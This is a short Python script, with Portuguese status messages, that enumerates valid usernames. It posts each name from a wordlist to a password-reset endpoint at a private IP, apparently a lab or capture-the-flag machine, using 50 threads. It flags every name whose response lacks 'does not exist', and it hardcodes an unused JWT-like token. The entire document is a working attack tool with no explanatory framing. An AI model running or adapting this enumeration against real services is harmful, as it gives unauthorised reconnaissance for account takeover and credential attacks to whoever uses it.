import requests
import sys
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings("ignore")

url = "http://10.65.170.188/auth/requestreset"
csfr = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
wordlist = sys.argv[1]

with open(wordlist, "r") as f:
    users = f.read().splitlines()

print(f"[*] Testando {len(users)} usuários...\n")

def check_user(user):
    try:
        r = requests.post(url, json={"user": user}, timeout=5)
        data = r.json()
        if "does not exist" not in str(data).lower():
            return f"[+] USUÁRIO VÁLIDO: {user} -> {data}"
    except:
        pass
    return None

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(check_user, user): user for user in users}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(result)

print("\n[*] Concluído!")
